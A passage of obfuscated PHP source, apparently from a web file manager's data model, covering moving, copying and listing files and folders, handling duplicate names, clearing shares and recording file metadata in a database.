$Âõç¸Ôá[$®µÂ£ñÊ[566]][] = $ŞšàÍ·»[$®µÂ£ñÊ[468]]; } } $this->chunkEventSet($®µÂ£ñÊ[578], array($®µÂ£ñÊ[579], $¥Ÿœ´¢Á, $›œ˜¦ıÊ)); $this->saveAll($á«ÇƒäÁ); $this->chunkEventSet($®µÂ£ñÊ[580], array($®µÂ£ñÊ[581], $¥Ÿœ´¢Á, $›œ˜¦ıÊ)); $this->saveAll($í–™½——); return $æºù§Òø; } private function _childrenMakeRelation($Æ··É½Û, $Ç£‰´Ã÷) { $ºÏ«’¥ =& $_SERVER[ñˆ‹ß¿÷]; $ÈØŞÌĞ¬ = array(); $ªƒØÄ×’ = array(); foreach ($Æ··É½Û as $ğŸ™ëÁ’) { $†ù•Æòå = $ğŸ™ëÁ’[$ºÏ«’¥[32]] . $ºÏ«’¥[8] . $ğŸ™ëÁ’[$ºÏ«’¥[521]]; $ÈØŞÌĞ¬[$†ù•Æòå] = $ğŸ™ëÁ’[$ºÏ«’¥[402]]; } foreach ($Ç£‰´Ã÷ as $ğŸ™ëÁ’) { $†ù•Æòå = $ğŸ™ëÁ’[$ºÏ«’¥[32]] . $ºÏ«’¥[8] . $ğŸ™ëÁ’[$ºÏ«’¥[521]]; $¯º‚‡é› = $ÈØŞÌĞ¬[$†ù•Æòå]; $ªƒØÄ×’[$¯º‚‡é›] = $ğŸ™ëÁ’[$ºÏ«’¥[402]]; } return $ªƒØÄ×’; } private function _childrenMatch($¯ã¬óÄ§, $¬ïÒÄê¥, $– ÓåŞ¿) { $Ü¼ğ‡Áô =& $_SERVER[ñˆ‹ß¿÷]; $‹ÅÃ˜‘¦ = $– ÓåŞ¿[$Ü¼ğ‡Áô[521]]; $´¦…ÃâÔ = $this->parentLevelArray($¬ïÒÄê¥[$Ü¼ğ‡Áô[521]]); foreach ($´¦…ÃâÔ as $Â×‰İ™ı) { if (isset($¯ã¬óÄ§[$Â×‰İ™ı])) { $‹ÅÃ˜‘¦ .= $¯ã¬óÄ§[$Â×‰İ™ı] . $Ü¼ğ‡Áô[582]; } } $‹ÅÃ˜‘¦ = rtrim($‹ÅÃ˜‘¦, $Ü¼ğ‡Áô[50]) . $Ü¼ğ‡Áô[50]; $À¡¶¬ = $this->parentLevelArray($‹ÅÃ˜‘¦); $çæ¢ßÀÁ = $À¡¶¬[count($À¡¶¬) - 1]; return array($Ü¼ğ‡Áô[432] => $çæ¢ßÀÁ, $Ü¼ğ‡Áô[521] => $‹ÅÃ˜‘¦); } private function _makeItemData($ĞÂš¢ñ÷, $šğ¨¤ëÌ, $ÃòÌÄİ) { $öšÆšŒú =& $_SERVER[ñˆ‹ß¿÷]; $£öğ¯Â© = array($öšÆšŒú[583] => $ĞÂš¢ñ÷[$öšÆšŒú[410]], $öšÆšŒú[420] => $ÃòÌÄİ, $öšÆšŒú[584] => $ĞÂš¢ñ÷[$öšÆšŒú[412]] ? $ĞÂš¢ñ÷[$öšÆšŒú[412]] : $öšÆšŒú[12], $öšÆšŒú[469] => $ĞÂš¢ñ÷[$öšÆšŒú[468]] ? $ĞÂš¢ñ÷[$öšÆšŒú[468]] : 0, $öšÆšŒú[585] => $ĞÂš¢ñ÷[$öšÆšŒú[76]] ? $ĞÂš¢ñ÷[$öšÆšŒú[76]] : 0, $öšÆšŒú[586] => intval($šğ¨¤ëÌ[$öšÆšŒú[411]]), $öšÆšŒú[587] => intval($šğ¨¤ëÌ[$öšÆšŒú[505]]), $öšÆšŒú[588] => intval(USER_ID), $öšÆšŒú[589] => intval(USER_ID), $öšÆšŒú[401] => intval($šğ¨¤ëÌ[$öšÆšŒú[402]]), $öšÆšŒú[590] => $šğ¨¤ëÌ[$öšÆšŒú[521]] . $šğ¨¤ëÌ[$öšÆšŒú[402]] . $öšÆšŒú[50], $öšÆšŒú[424] => $ĞÂš¢ñ÷[$öšÆšŒú[85]] ? $ĞÂš¢ñ÷[$öšÆšŒú[85]] : time(), $öšÆšŒú[430] => 0, $öšÆšŒú[591] => $öšÆšŒú[12]); return $£öğ¯Â©; } private function _copyApplyMeta($Á‹‹Ö, &$àõ¶âËÙ) { $ŠÍÕšüö =& $_SERVER[ñˆ‹ß¿÷]; $†¯¢²´õ = $Á‹‹Ö[$ŠÍÕšüö[402]]; $³·•×ª = $Á‹‹Ö[$ŠÍÕšüö[32]]; if (!isset($Á‹‹Ö[$ŠÍÕšüö[592]]) || !$Á‹‹Ö[$ŠÍÕšüö[592]] || $Á‹‹Ö[$ŠÍÕšüö[592]] == $ŠÍÕšüö[197]) { $àõ¶âËÙ[$ŠÍÕšüö[568]][] = array($ŠÍÕšüö[402], $†¯¢²´õ, $ŠÍÕšüö[592], short_id($†¯¢²´õ)); } if (Input::check($³·•×ª, $ŠÍÕšüö[593])) { $àõ¶âËÙ[$ŠÍÕšüö[567]][] = array($ŠÍÕšüö[402] => $†¯¢²´õ, $ŠÍÕšüö[94] => $ŠÍÕšüö[465], $ŠÍÕšüö[374] => str_replace($ŠÍÕšüö[53], $ŠÍÕšüö[12], Pinyin::get($³·•×ª))); $àõ¶âËÙ[$ŠÍÕšüö[567]][] = array($ŠÍÕšüö[402] => $†¯¢²´õ, $ŠÍÕšüö[94] => $ŠÍÕšüö[464], $ŠÍÕšüö[374] => Pinyin::get($³·•×ª, $ŠÍÕšüö[594])); } $àõ¶âËÙ[$ŠÍÕšüö[567]][] = array($ŠÍÕšüö[402] => $†¯¢²´õ, $ŠÍÕšüö[94] => $ŠÍÕšüö[444], $ŠÍÕšüö[374] => KodSort::makeStr($³·•×ª)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($ßâ˜ŸÎü) { $îËÂÅà =& $_SERVER[ñˆ‹ß¿÷]; $®±×¿Äş = $this->sourceInfo($ßâ˜ŸÎü); $Û÷ÌÂ¿ø = $îËÂÅà[595]; $ÏêåÓÂ£ = array($îËÂÅà[521] => array($îËÂÅà[550], $®±×¿Äş[$îËÂÅà[521]] . $ßâ˜ŸÎü . $îËÂÅà[551]), $îËÂÅà[431] => $this->targetIsDelete); $ùåìÈÍ€ = $this->field($Û÷ÌÂ¿ø)->where($ÏêåÓÂ£)->select(); if (!$ùåìÈÍ€) { return; } $ùåìÈÍ€ = array_to_keyvalue($ùåìÈÍ€, $îËÂÅà[402]); foreach ($ùåìÈÍ€ as $õ¿úİ†) { $ÜíëÊÙ× = $õ¿úİ†[$îËÂÅà[432]]; $ßâ˜ŸÎü = $õ¿úİ†[$îËÂÅà[402]]; if (!isset($this->_childrenListCache[$ßâ˜ŸÎü]) && $õ¿úİ†[$îËÂÅà[410]] == $îËÂÅà[88]) { $this->_childrenListCache[$ßâ˜ŸÎü] = array(); } if (!isset($this->_childrenListCache[$ÜíëÊÙ×])) { $this->_childrenListCache[$ÜíëÊÙ×] = array(); } $this->_childrenListCache[$ÜíëÊÙ×][$ßâ˜ŸÎü] = $õ¿úİ†; $this->_childrenItemCache[$ßâ˜ŸÎü] = $õ¿úİ†; } } private function _childrenListAll($‰İ×óÎÜ, &$Ìá×ùé) { $…èùõÂı =& $_SERVER[ñˆ‹ß¿÷]; if (!isset($this->_childrenListCache[$‰İ×óÎÜ])) { return; } $¦Ø´Í©â = $this->_childrenListCache[$‰İ×óÎÜ]; foreach ($¦Ø´Í©â as $ïö“ıŞÌ => $ü–¨Âñ) { $Ìá×ùé[$ïö“ıŞÌ] = $ü–¨Âñ; if ($ü–¨Âñ[$…èùõÂı[410]] == $…èùõÂı[88]) { $this->_childrenListAll($ïö“ıŞÌ, $Ìá×ùé); } } } private function sourceInfoCache($ÈÚØá·) { if (isset($this->_childrenItemCache[$ÈÚØá·])) { return $this->_childrenItemCache[$ÈÚØá·]; } return $this->sourceInfo($ÈÚØá·); } private function _childrenList($¢ƒ‰Š–÷) { if (isset($this->_childrenListCache[$¢ƒ‰Š–÷])) { return $this->_childrenListCache[$¢ƒ‰Š–÷]; } return $this->_childrenListSelect($¢ƒ‰Š–÷); } private function _childrenListSelect($€ÈøüåÚ) { $¦ŠÖ±üÎ =& $_SERVER[ñˆ‹ß¿÷]; $¹¹—‚Ô = array($¦ŠÖ±üÎ[432] => $€ÈøüåÚ, $¦ŠÖ±üÎ[431] => $this->targetIsDelete); $Ç»»´¶ = $this->where($¹¹—‚Ô)->select(); $Ç»»´¶ = $Ç»»´¶ ? $Ç»»´¶ : array(); $ä¿­âÁ¯ = array_to_keyvalue($Ç»»´¶, $¦ŠÖ±üÎ[402]); $this->_childrenListCache[$€ÈøüåÚ] = $ä¿­âÁ¯; foreach ($ä¿­âÁ¯ as $€ÈøüåÚ => $™É¹ü’ß) { $this->_childrenItemCache[$€ÈøüåÚ] = $™É¹ü’ß; } return $ä¿­âÁ¯; } private function fileNameExistCache($ŞÃ¨ı×¸, $ªˆ©¥ã¥) { $™ĞÈ€—™ =& $_SERVER[ñˆ‹ß¿÷]; $ªˆ©¥ã¥ = strtolower($ªˆ©¥ã¥); $ĞÚèŠ¬ = $this->_childrenList($ŞÃ¨ı×¸); foreach ($ĞÚèŠ¬ as $¡¢ÎÊã) { if ($ªˆ©¥ã¥ == strtolower($¡¢ÎÊã[$™ĞÈ€—™[32]])) { return $¡¢ÎÊã[$™ĞÈ€—™[402]]; } } return !1; } private function fileNameAutoCache($„Š¤à¯ñ, $úÎÉ¹É³, $×‘”‘¼», $Ö§¤ã²‰) { $â›¹¯Ô¿ =& $_SERVER[ñˆ‹ß¿÷]; $¤âİì™Ç = $this->_childrenList($„Š¤à¯ñ); $¡Ÿ¬™„¦ = array_to_keyvalue($¤âİì™Ç, $â›¹¯Ô¿[12], $â›¹¯Ô¿[32]); return $this->fileNameAutoGet($¡Ÿ¬™„¦, $úÎÉ¹É³, $×‘”‘¼», $Ö§¤ã²‰); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($ÙÚÔì‹î, $®·æ¢±, $û„ĞªíÑ = REPEAT_REPLACE, $…œó¯£Ç = '') { $ğ””ƒû =& $_SERVER[ñˆ‹ß¿÷]; $¼©‚ı¥ = $this->sourceInfo($ÙÚÔì‹î); $è…¶’ò× = $this->sourceInfo($®·æ¢±); if ($¼©‚ı¥[$ğ””ƒû[432]] == $è…¶’ò×[$ğ””ƒû[402]]) { if ($¼©‚ı¥[$ğ””ƒû[431]] == $ğ””ƒû[88]) { Model($ğ””ƒû[429])->restore(array($ÙÚÔì‹î)); } if (!$…œó¯£Ç || $…œó¯£Ç == $¼©‚ı¥[$ğ””ƒû[32]]) { return $ÙÚÔì‹î; } } $Ù¡­œ÷« = $this->pathInfoMore($ÙÚÔì‹î); if ($this->isParentOf($ÙÚÔì‹î, $®·æ¢±)) { return !1; } if (!$¼©‚ı¥ || !$è…¶’ò× || $è…¶’ò×[$ğ””ƒû[410]] != $ğ””ƒû[88]) { return !1; } Hook::trigger($ğ””ƒû[596], $Ù¡­œ÷«); $this->targetIsDelete = intval($¼©‚ı¥[$ğ””ƒû[431]]); if ($¼©‚ı¥[$ğ””ƒû[432]] == $®·æ¢± && $…œó¯£Ç != $¼©‚ı¥[$ğ””ƒû[32]]) { $Çåôï±° = $this->fileNameExist($®·æ¢±, $…œó¯£Ç); if ($Çåôï±° && $¼©‚ı¥[$ğ””ƒû[410]] == $ğ””ƒû[197]) { $£çäÓ²ş = $this->sourceInfo($Çåôï±°); $”Œïâıı = $this->fileHistory($£çäÓ²ş, $¼©‚ı¥[$ğ””ƒû[468]], $¼©‚ı¥[$ğ””ƒû[76]]); if (!$”Œïâıı) { Model($ğ””ƒû[471])->remove($¼©‚ı¥[$ğ””ƒû[468]]); } $this->removeNow($ÙÚÔì‹î, !1); $this->folderSizeReset($®·æ¢±); Hook::trigger($ğ””ƒû[597], $Ù¡­œ÷«); return $Çåôï±°; } } $İè¦‘¯… = $…œó¯£Ç ? $…œó¯£Ç : $¼©‚ı¥[$ğ””ƒû[32]]; $this->lockMoveStart($ÙÚÔì‹î); $this->lockWriteStart($®·æ¢±, $İè¦‘¯…); $»ÎˆÉğÖ = array($ğ””ƒû[566] => array(), $ğ””ƒû[598] => !1); $this->clearShare($ÙÚÔì‹î, $®·æ¢±); $ÁõıÙ¯İ = $this->fileNameExistCache($®·æ¢±, $¼©‚ı¥[$ğ””ƒû[32]]); $ÍüÉš»ñ = $this->_move($ÙÚÔì‹î, $®·æ¢±, $û„ĞªíÑ, $»ÎˆÉğÖ, $…œó¯£Ç); $this->sourceCacheClear(); if ($¼©‚ı¥[$ğ””ƒû[410]] == $ğ””ƒû[88] && $ÁõıÙ¯İ) { $this->folderSizeResetChildren($ÍüÉš»ñ); } Model($ğ””ƒû[199])->linkAdd($»ÎˆÉğÖ[$ğ””ƒû[566]]); if ($ÁõıÙ¯İ && $»ÎˆÉğÖ[$ğ””ƒû[598]]) { $this->removeNow($ÙÚÔì‹î, !1); } $this->lockMoveEnd($ÙÚÔì‹î); $this->lockWriteEnd($®·æ¢±, $İè¦‘¯…); $this->folderSizeReset($¼©‚ı¥[$ğ””ƒû[432]]); $this->folderSizeReset($®·æ¢±); $êÎ¢ƒŸ— = array($¼©‚ı¥[$ğ””ƒû[432]], $®·æ¢±); if ($¼©‚ı¥[$ğ””ƒû[410]] == $ğ””ƒû[88]) { $êÎ¢ƒŸ—[] = $ÙÚÔì‹î; } $this->updateModifyTime($êÎ¢ƒŸ—); Model($ğ””ƒû[570])->eventMove($ÙÚÔì‹î, $¼©‚ı¥[$ğ””ƒû[432]], $®·æ¢±); Hook::trigger($ğ””ƒû[597], $Ù¡­œ÷«); return $ÍüÉš»ñ; } private function _move($«·˜Ò¬ñ, $ï”Ã×¾, $±‘®‚ª , &$ï“‘Ê÷Ø, $Ô•ÍÆ†Ú = '') { $şâÃ‚Û— =& $_SERVER[ñˆ‹ß¿÷]; $Ï´«¥«é = $this->sourceInfo($«·˜Ò¬ñ); $¤áúÈç˜ = $Ï´«¥«é[$şâÃ‚Û—[410]] == $şâÃ‚Û—[88]; $Å­€¨Ö¨ = $Ô•ÍÆ†Ú ? $Ô•ÍÆ†Ú : $Ï´«¥«é[$şâÃ‚Û—[32]]; $¬”ÈÖª» = $this->fileNameExistCache($ï”Ã×¾, $Å­€¨Ö¨); $this->lockMoveStart($«·˜Ò¬ñ); $this->lockWriteStart($ï”Ã×¾, $Å­€¨Ö¨); if (!$¬”ÈÖª») { return $this->_moveForce($«·˜Ò¬ñ, $ï”Ã×¾, $Å­€¨Ö¨); } $ÌŞ¦§±Á = $¬”ÈÖª»; $óÇ×ƒã« = !1; if ($¤áúÈç˜) { if ($±‘®‚ª  == REPEAT_RENAME_FOLDER) { $Å­€¨Ö¨ = $this->fileNameAuto($ï”Ã×¾, $Å­€¨Ö¨, $±‘®‚ª , $¤áúÈç˜); $ÌŞ¦§±Á = $this->_moveForce($«·˜Ò¬ñ, $ï”Ã×¾, $Å­€¨Ö¨); } else { if ($±‘®‚ª  == REPEAT_RENAME_FOLDER) { $±‘®‚ª  = REPEAT_RENAME; } $ŞÇ³‰ë± = $this->_childrenListSelect($«·˜Ò¬ñ); foreach ($ŞÇ³‰ë± as $ûø¦º›–) { $this->_move($ûø¦º›–[$şâÃ‚Û—[402]], $¬”ÈÖª», $±‘®‚ª , $ï“‘Ê÷Ø); } $óÇ×ƒã« = !0; } } else { if ($±‘®‚ª  == REPEAT_SKIP) { $óÇ×ƒã« = !0; } else { if ($±‘®‚ª  == REPEAT_RENAME || $±‘®‚ª  == REPEAT_RENAME_FOLDER) { $Å­€¨Ö¨ = $this->fileNameAuto($ï”Ã×¾, $Å­€¨Ö¨, $±‘®‚ª , $¤áúÈç˜); $ÌŞ¦§±Á = $this->_moveForce($«·˜Ò¬ñ, $ï”Ã×¾, $Å­€¨Ö¨); } else { if ($±‘®‚ª  == REPEAT_REPLACE) { $¨«ù…Â® = $this->sourceInfoCache($¬”ÈÖª»); $Ç”ÆÖ­Ü = $this->fileHistory($¨«ù…Â®, $Ï´«¥«é[$şâÃ‚Û—[468]], $Ï´«¥«é[$şâÃ‚Û—[76]]); $óÇ×ƒã« = !0; if ($Ç”ÆÖ­Ü) { $ï“‘Ê÷Ø[$şâÃ‚Û—[566]][] = $Ï´«¥«é[$şâÃ‚Û—[468]]; } } } } } if ($óÇ×ƒã« && !$ï“‘Ê÷Ø[$şâÃ‚Û—[598]]) { $ï“‘Ê÷Ø[$şâÃ‚Û—[598]] = !0; } return $ÌŞ¦§±Á; } private function _moveForce($¡§Ÿ»š´, $İŞ¬ê–Œ, $ÜªéÆÈ§) { $½ß…ó¤ç =& $_SERVER[ñˆ‹ß¿÷]; $¸‡Øó¼ = $this->sourceInfo($¡§Ÿ»š´); $š›ÇÚå¼ = $this->sourceInfo($İŞ¬ê–Œ); $®øæ¤ı = $¸‡Øó¼[$½ß…ó¤ç[410]] == $½ß…ó¤ç[88]; $¶Ç§éı£ = array($½ß…ó¤ç[401] => $š›ÇÚå¼[$½ß…ó¤ç[402]], $½ß…ó¤ç[590] => $š›ÇÚå¼[$½ß…ó¤ç[521]] . $š›ÇÚå¼[$½ß…ó¤ç[402]] . $½ß…ó¤ç[50], $½ß…ó¤ç[586] => $š›ÇÚå¼[$½ß…ó¤ç[411]], $½ß…ó¤ç[587] => $š›ÇÚå¼[$½ß…ó¤ç[505]], $½ß…ó¤ç[589] => USER_ID, $½ß…ó¤ç[420] => $ÜªéÆÈ§); $“ï¡ºÕé = $¸‡Øó¼[$½ß…ó¤ç[411]] == SourceModel::TYPE_GROUP && $š›ÇÚå¼[$½ß…ó¤ç[411]] == SourceModel::TYPE_GROUP && $¸‡Øó¼[$½ß…ó¤ç[505]] == $š›ÇÚå¼[$½ß…ó¤ç[505]]; if (!$“ï¡ºÕé && $this->moveClearAuth) { Model($½ß…ó¤ç[502])->authClear($¡§Ÿ»š´); } $§Â¦³æò = $¸‡Øó¼[$½ß…ó¤ç[431]] == $½ß…ó¤ç[88] && $š›ÇÚå¼[$½ß…ó¤ç[431]] != $½ß…ó¤ç[88]; if ($§Â¦³æò) { $¶Ç§éı£[$½ß…ó¤ç[430]] = 0; } if ($®øæ¤ı) { $”î²ÛÏ± = array($½ß…ó¤ç[590] => array($½ß…ó¤ç[550], $¸‡Øó¼[$½ß…ó¤ç[521]] . $¸‡Øó¼[$½ß…ó¤ç[402]] . $½ß…ó¤ç[551])); $€¤Ğ¢ù = $¸‡Øó¼[$½ß…ó¤ç[521]] . $¸‡Øó¼[$½ß…ó¤ç[402]] . $½ß…ó¤ç[50]; $¡â†Ó©† = $š›ÇÚå¼[$½ß…ó¤ç[521]] . $š›ÇÚå¼[$½ß…ó¤ç[402]] . $½ß…ó¤ç[50] . $¸‡Øó¼[$½ß…ó¤ç[402]] . $½ß…ó¤ç[50]; $éèˆÎÉÑ = array($½ß…ó¤ç[590] => array($½ß…ó¤ç[599], "\x72\145\x70\x6c\141\x63\145\x28\x70\x61\x72\145\x6e\164\114\145\x76\x65\x6c\x2c\x27{$€¤Ğ¢ù}\47\x2c\x27{$¡â†Ó©†}\47\51"), $½ß…ó¤ç[586] => $š›ÇÚå¼[$½ß…ó¤ç[411]], $½ß…ó¤ç[587] => $š›ÇÚå¼[$½ß…ó¤ç[505]]); if ($§Â¦³æò) { $éèˆÎÉÑ[$½ß…ó¤ç[430]] = 0; } $this->where($”î²ÛÏ±)->data($éèˆÎÉÑ)->save(); } $this->where(array($½ß…ó¤ç[417] => $¡§Ÿ»š´))->data($¶Ç§éı£)->save(); return $¡§Ÿ»š´; } private function clearShare($¤í«Û£, $¶¯¨²ûí) { $ÁŞ¹€şˆ =& $_SERVER[ñˆ‹ß¿÷]; $ÙİÓÂ÷¹ = $this->sourceInfo($¤í«Û£); $ÛÈ¸şİ€ = $this->sourceInfo($¶¯¨²ûí); if ($ÙİÓÂ÷¹[$ÁŞ¹€şˆ[505]] == $ÛÈ¸şİ€[$ÁŞ¹€şˆ[505]] && $ÙİÓÂ÷¹[$ÁŞ¹€şˆ[411]] == $ÁŞ¹€şˆ[600]) { return; } $ˆâ‹Ğş¸ = array($ÁŞ¹€şˆ[521] => array($ÁŞ¹€şˆ[550], $ÙİÓÂ÷¹[$ÁŞ¹€şˆ[521]] . $¤í«Û£ . $ÁŞ¹€şˆ[551])); $‹íÉïÚ‘ = $this->field($ÁŞ¹€şˆ[417])->where($ˆâ‹Ğş¸)->getField($ÁŞ¹€şˆ[402], !0); if (!$‹íÉïÚ‘) { return; } $ˆâ‹Ğş¸ = array($ÁŞ¹€şˆ[402] => array($ÁŞ¹€şˆ[7], $‹íÉïÚ‘), $ÁŞ¹€şˆ[496] => 1); $“ş½Ùƒ = Model($ÁŞ¹€şˆ[601])->field($ÁŞ¹€şˆ[489])->where($ˆâ‹Ğş¸)->select(); if (!$“ş½Ùƒ) { return; } $“ş½Ùƒ = array_to_keyvalue($“ş½Ùƒ, $ÁŞ¹€şˆ[12], $ÁŞ¹€şˆ[489]); $ˆâ‹Ğş¸ = array($ÁŞ¹€şˆ[489] => array($ÁŞ¹€şˆ[7], $“ş½Ùƒ)); Model($ÁŞ¹€şˆ[601])->where($ˆâ‹Ğş¸)->save(array($ÁŞ¹€şˆ[496] => 0)); Model($ÁŞ¹€şˆ[602])->where($ˆâ‹Ğş¸)->delete(); } public function copyFolderFromIO($¶–¯ÁÆ·, $ş¡ êÙ, $‘ÑœŞÔ¬, $¢–êş¬à, $Ò¶ÕºŠ‰, $ƒé³Öˆ™ = false) { $µÁá“Ü˜ =& $_SERVER[ñˆ‹ß¿÷]; $²‚¡Æ›Ì = array($µÁá“Ü˜[567] => array(), $µÁá“Ü˜[568] => array(), $µÁá“Ü˜[566] => array(), $µÁá“Ü˜[603] => array()); $Ú¹†¢û® = $ƒé³Öˆ™ ? $ƒé³Öˆ™ : $¶–¯ÁÆ·->pathThis($ş¡ êÙ); $µĞ§¶½ = $this->fileNameExist($‘ÑœŞÔ¬, $Ú¹†¢û®); $¿óğÏ¼† = $this->mkdir($‘ÑœŞÔ¬, $Ú¹†¢û®, $¢–êş¬à); if (!$µĞ§¶½ || $¢–êş¬à == REPEAT_RENAME_FOLDER) { $¢–êş¬à = !1; } if ($µĞ§¶½) { $this->_childrenAllMake($µĞ§¶½); } Hook::trigger($µÁá“Ü˜[604]); $this->_copyChildTo($¶–¯ÁÆ·, $ş¡ êÙ, $¿óğÏ¼†, $¢–êş¬à, $²‚¡Æ›Ì, $Ò¶ÕºŠ‰); Hook::trigger($µÁá“Ü˜[605]); if ($¿óğÏ¼†) { $this->folderSizeResetChildren($¿óğÏ¼†); } $this->_childrenListClear(); Model($µÁá“Ü˜[569])->addAll($²‚¡Æ›Ì[$µÁá“Ü˜[567]], array(), !0); Model($µÁá“Ü˜[570])->eventCopy($¿óğÏ¼†); $this->saveAll($²‚¡Æ›Ì[$µÁá“Ü˜[568]]); Model($µÁá“Ü˜[471])->linkAdd($²‚¡Æ›Ì[$µÁá“Ü˜[566]]); Model($µÁá“Ü˜[471])->remove($²‚¡Æ›Ì[$µÁá“Ü˜[603]]); $this->folderSizeReset($‘ÑœŞÔ¬); $this->updateModifyTime($‘ÑœŞÔ¬); return $¿óğÏ¼†; } private function _copyChildTo($ñÍÄ´‡¤, $æˆ°ïÒ¥, $·óî«, $õ€©•Ó’, &$³Í»ê¡Ó, $¾Ïİ€Äõ) { $°ãÅô‹º =& $_SERVER[ñˆ‹ß¿÷]; $ù­Æº¤ë = $this->sourceInfoCache($·óî«); $ÜÉ‹Ò„© = $ñÍÄ´‡¤->listPath($æˆ°ïÒ¥); $ÜÉ‹Ò„© = $ÜÉ‹Ò„© ? $ÜÉ‹Ò„© : array($°ãÅô‹º[83] => array(), $°ãÅô‹º[82] => array()); $ÇøŞ¤¨ = array_merge($ÜÉ‹Ò„©[$°ãÅô‹º[83]], $ÜÉ‹Ò„©[$°ãÅô‹º[82]]); $ªÅ·…© = $this->_addFiles($ñÍÄ´‡¤, $ÜÉ‹Ò„©[$°ãÅô‹º[83]], $¾Ïİ€Äõ); $ä¨ñ¬ñ = array(); foreach ($ÇøŞ¤¨ as &$™šâÚµÅ) { if (isset($ªÅ·…©[$™šâÚµÅ[$°ãÅô‹º[32]]])) { $™šâÚµÅ = $ªÅ·…©[$™šâÚµÅ[$°ãÅô‹º[32]]]; } $™šâÚµÅ[$°ãÅô‹º[410]] = $™šâÚµÅ[$°ãÅô‹º[33]] == $°ãÅô‹º[75]; $™šâÚµÅ[$°ãÅô‹º[412]] = substr(_get($™šâÚµÅ, $°ãÅô‹º[174], $°ãÅô‹º[12]), 0, 10); $™šâÚµÅ[$°ãÅô‹º[76]] = _get($™šâÚµÅ, $°ãÅô‹º[76], 0); $™šâÚµÅ[$°ãÅô‹º[468]] = _get($™šâÚµÅ, $°ãÅô‹º[468], 0); if (!isset($™šâÚµÅ[$°ãÅô‹º[606]]) && $™šâÚµÅ[$°ãÅô‹º[468]]) { $³Í»ê¡Ó[$°ãÅô‹º[603]][] = $™šâÚµÅ[$°ãÅô‹º[468]]; } if ($õ€©•Ó’) { $ŠºÎŞ•å = $this->fileNameExistCache($·óî«, $™šâÚµÅ[$°ãÅô‹º[32]]); if ($ŠºÎŞ•å) { if ($™šâÚµÅ[$°ãÅô‹º[410]] || $õ€©•Ó’ == REPEAT_SKIP) { continue; } if ($õ€©•Ó’ == REPEAT_REPLACE) { $‰×‚¬ì­ = $this->sourceInfoCache($ŠºÎŞ•å); $Î¯ÓÑ““ = $this->fileHistory($‰×‚¬ì­, $™šâÚµÅ[$°ãÅô‹º[468]], $™šâÚµÅ[$°ãÅô‹º[76]]); if ($Î¯ÓÑ““) { $³Í»ê¡Ó[$°ãÅô‹º[566]][] = $™šâÚµÅ[$°ãÅô‹º[468]]; } continue; } else { if ($õ€©•Ó’ == REPEAT_RENAME) { $™šâÚµÅ[$°ãÅô‹º[32]] = $this->fileNameAutoCache($·óî«, $™šâÚµÅ[$°ãÅô‹º[32]], $õ€©•Ó’, !1); } } } } if (!$™šâÚµÅ[$°ãÅô‹º[410]] && $™šâÚµÅ[$°ãÅô‹º[468]] == 0) { continue; } if (!$™šâÚµÅ[$°ãÅô‹º[410]] && $™šâÚµÅ[$°ãÅô‹º[468]]) { $³Í»ê¡Ó[$°ãÅô‹º[566]][] = $™šâÚµÅ[$°ãÅô‹º[468]]; } $ä¨ñ¬ñ[] = $this->_makeItemData($™šâÚµÅ, $ù­Æº¤ë, $™šâÚµÅ[$°ãÅô‹º[32]]); } unset($™šâÚµÅ); if (!empty($ä¨ñ¬ñ)) { $this->addAll($ä¨ñ¬ñ); $this->_childrenListSelect($·óî«); } $È¸¯Öƒ‰ = $this->_childrenList($·óî«); $È¸¯Öƒ‰ = array_to_keyvalue($È¸¯Öƒ‰, $°ãÅô‹º[32]); foreach ($ÇøŞ¤¨ as $™šâÚµÅ) { $‰×‚¬ì­ = $È¸¯Öƒ‰[$™šâÚµÅ[$°ãÅô‹º[32]]]; $ª—ˆøû‰ = $‰×‚¬ì­[$°ãÅô‹º[402]]; $this->_copyApplyMeta($‰×‚¬ì­, $³Í»ê¡Ó); if ($™šâÚµÅ[$°ãÅô‹º[33]] == $°ãÅô‹º[75]) { $™šâÚµÅ[$°ãÅô‹º[84]] = $ñÍÄ´‡¤->getPathInner($™šâÚµÅ[$°ãÅô‹º[84]]); $this->_copyChildTo($ñÍÄ´‡¤, $™šâÚµÅ[$°ãÅô‹º[84]], $ª—ˆøû‰, $õ€©•Ó’, $³Í»ê¡Ó, $¾Ïİ€Äõ); } } } private function _addFiles($¢é±ÔÁÌ, $¼ÕîÕÓÑ, $…ïÏ¬·à) { $“°æô€Œ =& $_SERVER[ñˆ‹ß¿÷]; if (!$¼ÕîÕÓÑ || count($¼ÕîÕÓÑ) == 0) { return array(); } $ºäÔØ”î = array(); foreach ($¼ÕîÕÓÑ as &$ûİÄ‚ëš) { Hook::trigger($“°æô€Œ[607], $ûİÄ‚ëš); $ûİÄ‚ëš[$“°æô€Œ[84]] = $¢é±ÔÁÌ->getPathInner($ûİÄ‚ëš[$“°æô€Œ[84]]); $äˆ‰‚ = $¢é±ÔÁÌ->hashSimple($ûİÄ‚ëš[$“°æô€Œ[84]]); $İîÂÒÒÂ = $¢é±ÔÁÌ->hashMd5($ûİÄ‚ëš[$“°æô€Œ[84]]); if (strlen($İîÂÒÒÂ) > 10 && !isset($ºäÔØ”î[$İîÂÒÒÂ])) { $ºäÔØ”î[$İîÂÒÒÂ] = array(); } $ûİÄ‚ëš[$“°æô€Œ[177]] = $äˆ‰‚; $ûİÄ‚ëš[$“°æô€Œ[176]] = $İîÂÒÒÂ; $ºäÔØ”î[$İîÂÒÒÂ][] =& $ûİÄ‚ëš; if (count($ºäÔØ”î[$İîÂÒÒÂ]) > 1) { $ûİÄ‚ëš[$“°æô€Œ[606]] = !0; } Hook::trigger($“°æô€Œ[608], $ûİÄ‚ëš); } unset($ûİÄ‚ëš); $¾Á–ÇŠ = array($“°æô€Œ[176] => array($“°æô€Œ[7], array_keys($ºäÔØ”î))); $­Ù•ê˜ = Model($“°æô€Œ[609]); $’€ÜèÇ• = $­Ù•ê˜->where($¾Á–ÇŠ)->select(); $’€ÜèÇ• = $’€ÜèÇ• ? $’€ÜèÇ• : array(); foreach ($’€ÜèÇ• as $¶ıÌØ¢·) { if (!isset($ºäÔØ”î[$¶ıÌØ¢·[$“°æô€Œ[176]]])) { continue; } $ĞÕåÕÇĞ = $ºäÔØ”î[$¶ıÌØ¢·[$“°æô€Œ[176]]]; foreach ($ĞÕåÕÇĞ as &$ûİÄ‚ëš) { $ûİÄ‚ëš[$“°æô€Œ[468]] = $¶ıÌØ¢·[$“°æô€Œ[468]]; 